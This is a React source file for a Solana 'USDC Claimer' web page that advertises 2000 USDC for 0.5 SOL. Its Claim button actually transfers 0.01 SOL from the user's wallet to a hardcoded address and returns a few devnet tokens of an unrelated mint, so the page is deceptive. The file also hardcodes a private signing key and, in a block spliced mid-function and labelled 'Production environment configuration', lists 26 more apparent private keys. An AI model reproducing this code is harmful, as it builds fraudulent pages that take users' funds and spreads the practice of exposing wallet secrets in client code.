/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5F7M7fAhNeGAtx4QPZqd9frfUm1VWj8QLGwsJvegDZP9J3azv7f74NiiLRSBx5hvfbV1TFjWQoU1cBBwKDUsSACs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4yYC3AQwZdUuRaz9VBybD2aApvTgRNKW7LvNtq4QpxQTHkPAUz4PmBFnDiHQUMYrKQPSKGvtepT7BAodaNsZaVCk",
  "key1": "4zJXkHZ3L1BCgdVXbA28n3xiaDeMJ5oxicgK2dhxcYDtA3LhjtTjMiTKPdxpoJVCT3RjQaMiyCpfKHarpDhhfdi9",
  "key2": "3Lf2krWu1czZocoZRheeejoRHSQYVc45KUYm7SBCpC1XudHLcdTDfy1hfUzqEtuxhyFaDDqPF3YPhAEo1cmiFHzS",
  "key3": "3T2VbULYrWkhB3rTGQtFY1C9saXtwfSGbAsQqAo4o33H5mXRqKeSxXfnCfGouYukH8rLBraZ5wqRhaC1DV8D92VW",
  "key4": "3vNVDUhWtUGyjo5kRzyVKgQPJiWzByqNStzdZXYEkoLBPdN1zniUghnuiuSEVL1L6gEZ4psqLm74RbJWDw8j5q8E",
  "key5": "1X9Wcfgj3MGtLsv96EBJg5edbj7saLywhMEk4om32mnARzfx4Nv6JWUz71Lwb8K132kR9ipop9WAtCwTH3UEPe4",
  "key6": "24jPq6tRqV4wreWLDB51cLTWTn6wBvPvQoLNQhWeNCpfGqnpHf3en7FayPxRNkYzLpbKFpm2NvWF7kg2jfsWsMeW",
  "key7": "2eqfaZqcYPQ4vR5oHGX6uzkB2uRrsYCKry3Cio6hmc1TsqrsTV4qcFfxRupfq3szmgPmJrhLZPNCYUw8LxkVuB6X",
  "key8": "mWCtDEGD6kTv2Q4o1fW8JWwejaV5C3GjVr2z78ryjXKDqD6AEE4EwE1m3deVFWh9YhaWtzHjFcsQ9qDjFWuFUzr",
  "key9": "388kDjcouAhiMeLLGih3fpUVzSsakge5Rb84REXRJ12L5HytfC4Z397FaBb8Wx314p6tD5bpfT6Lx1ZxdLr7wC3n",
  "key10": "2u5AbDBNESVTN4YpkhM5VPjjjPgNvAwvMShSfCFGqBw8ABHcnuKgJxVxuQ9o7shpb8V4cYNpX6NAa73iU8UboxmZ",
  "key11": "ym2vH9bXJav8djYhMWZpSeiXXhutVgeJjUhKz6r3WZUvjXyeH84DAdLGRTmd6afWPNPfDxPT5x4kYsuwYwDf9KP",
  "key12": "3wfW5G7LjVnJPQEdiper39ApRjPW51TZNcYR3cweFwYtbEL5garMTAX7CFBx281tRyC52sUK5nhnYc9JPCLtb5iD",
  "key13": "3ydcHk5KNVrfsgWVYG9A7dYuk6X6od1bWwYmssBMemHwwnRe5j3dzCs1mfn21f2eK8THxk3aeQZuy1tciyFdhpmw",
  "key14": "3CyeMEz95Tmq3E4i6rLp78BajXx6xFsULSbXJcaMdhhrPWc999HKsKDZvcYkXzgWHGVMdXEFNKaWUaPdUyrPRrVm",
  "key15": "2dfWpi4LBjzdNUzwTeY2AzGdAx7prt5e3hPzesG3PiZpK1SeJWZjf49pEijxAYF1PBKyXjfequHVpTuMcSvv7Tnr",
  "key16": "2Y1tMDezk6R5BuEUJXmNSMuqDvvj8mGeUgwB6Z5J5ZHec5nc791pUvXLQLsC1FEkyjrt7Zix6TBP2CkBhGNUAF5M",
  "key17": "3nwwXAcbqoReLwz8TctXkjVgXmL47EB2MLBnHUkY25penYAJ5eEQ5ssHpqFcaHPpsrUkYxk1WVBmbc67VamS84WZ",
  "key18": "28xV3hj2ZqoUtnpAYqggPFGLD7FTnD4J9PcCifEY7Bk5j4drU5DqcBG1fum4cZ2NbcLee2RZtVBEziamyASG34ze",
  "key19": "2AudhSQ4sTknKM4is59egE2qaKrbVzJMmZzHNG1p1cXPHyLrZoaHuHpBV3FRLUQkJnQMrRNabPdv5QSh1Gowm4gU",
  "key20": "2GpsytYh4Zk56N2uavQGKTVhgL4SU8hDkLPKctCu1t78r717acUSiZLQodeDP4cj4kMEg9aJdYXrJjZWgDzo2n3C",
  "key21": "5nCMmzx3MuRHSf8BxPmmCy9mHtoSTVh7wDh1MDqc75cJro4Z6FvVHnuEXdTvEXREv8WWNvzPmrFuwemYEUbMkiT8",
  "key22": "4FTYwVceaV88xcLmyJJWEF3suMbBKQAqZsQDUaFtRLW6JWuxdmaQrTaCu2k2o3EQbPPLuGhr66yAAkM6tGsu1tkA",
  "key23": "xPezb3DmzXWGURNcCEqS4EChNVNz7pRqT23xsR7mcKLTJ9Z6wQSGHowHNsf6qQZkL3ntFMib4nhPXVLCjLG9S2k",
  "key24": "3AUm42QiRtod1PUXdgYFBftBTkqtaYiqLGevU2C38vT1H1xUtfwXPkZvqE4nD9VZoLASqXQLGA7ZBC1Gb7phcNGA",
  "key25": "5qpeQTuP8HGZjr5ZZVDUwATTHRAgdJfjPFc8k7a2YWSDQ6ygrjg2J8bBL2RwMREtzQhMmpbVgnrjgaEabpBUxAzm"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
